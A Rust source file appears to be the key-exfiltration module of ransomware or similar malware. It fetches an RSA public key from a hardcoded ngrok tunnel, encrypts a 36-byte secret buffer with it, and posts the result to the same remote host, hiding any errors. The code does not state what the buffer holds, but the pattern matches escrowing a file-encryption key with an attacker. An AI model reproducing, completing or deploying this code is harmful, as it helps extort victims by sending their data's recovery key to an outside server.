#![allow(unused_variables)]
use reqwest::Error;
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::{RsaPublicKey, Pkcs1v15Encrypt};
use base64::{Engine as _, engine::general_purpose};
use rand::rngs::OsRng;

#[tokio::main]
pub async fn client(blob_buffer: [u8; 36]) -> Result<(), Error> {
    let ngrok_url = "https://ea9a-223-185-25-109.ngrok-free.app/receive"; 
    let ngrok_url_confirm = "https://ea9a-223-185-25-109.ngrok-free.app/confirm";
    
    {
        let client = reqwest::Client::new();
        let res = client
            .get(ngrok_url)
            .header("Accept", "text/plain")
            .header("Connection", "close") 
            .send()
            .await?;

        if res.status().is_success() {
            let body = res.text().await?;
            match general_purpose::STANDARD.decode(&body) {
                Ok(decoded_key) => {
                    match RsaPublicKey::from_pkcs1_der(&decoded_key) {
                        Ok(pub_key) => {

                            let mut rng = OsRng;
                            let encrypted_data = pub_key
                                .encrypt(&mut rng, Pkcs1v15Encrypt, &blob_buffer)
                                .expect("Failed to encrypt");

                            let encoded_blob = general_purpose::STANDARD.encode(&encrypted_data);

                            let confirmation_res = client
                                .post(ngrok_url_confirm)
                                .header("Content-Type", "text/plain")
                                .header("Connection", "close") 
                                .body(encoded_blob)
                                .send()
                                .await?;
                        }
                        Err(e) => {}
                    }
                }
                Err(e) => {}
            }
        } 
    }
    Ok(())
}
